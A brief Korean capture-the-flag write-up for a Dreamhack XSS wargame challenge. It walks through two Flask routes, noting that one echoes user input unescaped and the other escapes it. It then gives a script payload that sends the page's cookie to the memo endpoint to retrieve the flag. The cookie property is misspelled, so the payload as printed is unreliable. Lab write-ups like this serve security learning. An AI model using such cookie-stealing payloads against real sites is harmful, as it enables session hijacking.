# XSS-1 
## 날짜
026-09-16

## 문제 URL
https://dreamhack.io/wargame/challenges/28

### 코드 분석

```python
@app.route("/vuln")
def vuln():
    param = request.args.get("param", "")
    return param
```
이용자가 전달한 param 파라미터 값을 출력한다.


```python
memo_text = ""


@app.route("/memo")
def memo():
    global memo_text
    text = request.args.get("memo", "")
    memo_text += text + "\n"
    return render_template("memo.html", memo=memo_text)

```
이용자의 입력값을 출력한다. 그러나 /memo는 /vuln과 다르게 render_template()로 전달된 변수를 html 엔티티코드로 변환해 저장하므로 XSS가 발생하지 않는다. /vuln은 그런 과정이 없기에 XSS가 발생한다.



## 취약점
/flag 엔드포인트에 다음을 입력한다.
```html
<script>location.href="/memo?memo="+document.cookies;</script>
```
/memo 엔드포인트에서 출력된 flag를 확인할 수 있다.


